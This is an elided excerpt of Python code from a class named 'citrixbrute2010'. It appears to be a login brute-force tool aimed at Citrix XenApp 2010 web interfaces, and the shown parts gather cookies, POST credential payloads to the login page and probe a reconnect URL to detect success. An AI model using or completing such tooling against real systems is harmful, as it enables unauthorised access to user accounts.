...
class citrixbrute2010():
    ...
    def appDetect(self, config, c, cookies2, cpost):
       resp3 = c.get(config["protocol"] + '://'+ config["HOST"] + ':' + config["port"] + '/Citrix/XenApp/site/default.aspx?CTX_MessageType=INFORMATION&CTX_MessageKey=WorkspaceControlReconnectPartialTemp', cookies=cookies2, allow_redirects=False, verify=True)
    ...
    def connectTest(self, config, payload, SESSION_TOKEN, cookies2):
        with session() as c:
           cpost = c.post(config["protocol"] + '://' + config["HOST"] + ":" + config["port"] + '/Citrix/XenApp/auth/login.aspx', cookies=cookies2, data=payload, allow_redirects=False, verify=True)
    ...
    def payload(self, config):
        with session() as c:
            silentDetect = c.get(config["protocol"] + '://' + config["HOST"] + '/Citrix/XenApp/auth/silentDetection.aspx', allow_redirects=True, verify=True)
            ...
            cget = c.get(config["protocol"] + '://' + config["HOST"] + ":" + config["port"] + '/Citrix/XenApp/auth/login.aspx', cookies=cookies2, allow_redirects=False, verify=True)
